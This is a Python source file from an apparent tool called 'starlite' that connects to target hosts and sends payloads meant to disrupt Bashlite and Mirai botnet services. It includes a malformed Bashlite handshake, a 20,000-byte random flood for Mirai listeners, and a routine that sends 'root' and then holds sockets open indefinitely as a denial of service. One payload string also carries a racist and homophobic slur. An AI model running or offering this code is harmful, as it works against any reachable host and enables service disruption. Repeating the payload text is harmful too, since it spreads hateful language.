import socket
import random
import time
import string

BASHLITE_PAYLOAD1 = b"\\x04int []\\x0A\\x12\\x34\\x50\\x36;Device Connected; \\x34"
BASHLITE_PAYLOAD2 = b"\\033[37m\\r\\n\\033[37m[\\033[36mstarlite\\033[37m] gayniggers from outer space\\r\\n"

MIRAI_PAYLOAD_SIZE = 20000

def send_bashlite_payload(sock: socket.socket, ip: str, port: int):
    print(f"[starlite] [bashlite] entered send_bashlite_payload for {ip}:{port}")
    try:
        print(f"[starlite] [bashlite] using existing connection to {ip}:{port}, sending payload")
        sock.sendall(BASHLITE_PAYLOAD1)
        sock.sendall(BASHLITE_PAYLOAD2)
        print(f"[starlite] [bashlite] payload sent to {ip}:{port}")
    except socket.timeout:
        print(f"[starlite] [bashlite] send operation to {ip}:{port} timed out (or other socket error)")
    except socket.error as e:
        print(f"[starlite] [bashlite] socket error for {ip}:{port}: {e}")
    # finally: # Socket is closed by the caller (scanner_logic.py)
    # print(f"[starlite] [bashlite] finished with {ip}:{port}")

def send_mirai_payload(sock: socket.socket, ip: str, port: int):
    print(f"[starlite] [mirai] entered send_mirai_payload for {ip}:{port}")
    payload = ''.join(random.choice(string.digits) for _ in range(MIRAI_PAYLOAD_SIZE)).encode('ascii')
    
    try:
        print(f"[starlite] [mirai] using existing connection to {ip}:{port}")
        
        #print(f"[starlite] [mirai] preparing to send payload to {ip}:{port}")
        sock.sendall(payload)
        print(f"[starlite] [mirai] payload sent to {ip}:{port}")
        return True
    except socket.timeout:
        print(f"[starlite] [mirai] send operation to {ip}:{port} timed out (or other socket error)")
        return False
    except socket.error as e:
        print(f"[starlite] [mirai] socket error during send to {ip}:{port}: {e}")
        return False
    # finally: # Socket is closed by the caller (scanner_logic.py)
    # print(f"[starlite] [mirai] finished with {ip}:{port}")

def hold_connection(ip: str, port: int, connect_timeout: int = 1):
    sock = None # Initialize sock to None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(connect_timeout) 
        sock.connect((ip, port))
        
        sock.settimeout(None) 
        
        print(f"[starlite] [mirai_dos] connected to {ip}:{port}, sending 'root' and holding socket open...")
        sock.sendall(b"root\\n")
        while True:
            time.sleep(1)
    except socket.timeout:
        print(f"[starlite] [mirai_dos] connection to {ip}:{port} timed out during connect.")
    except socket.error as e:
        print(f"[starlite] [mirai_dos] socket error for {ip}:{port}: {e}")
    except KeyboardInterrupt:
        print(f"[starlite] [mirai_dos] hold connection for {ip}:{port} interrupted.")
    finally:
        if sock:
            try:
                sock.close()
            except socket.error:
                pass
        # print(f"[starlite] [mirai_dos] connection closed for {ip}:{port}")

if __name__ == '__main__':
    pass 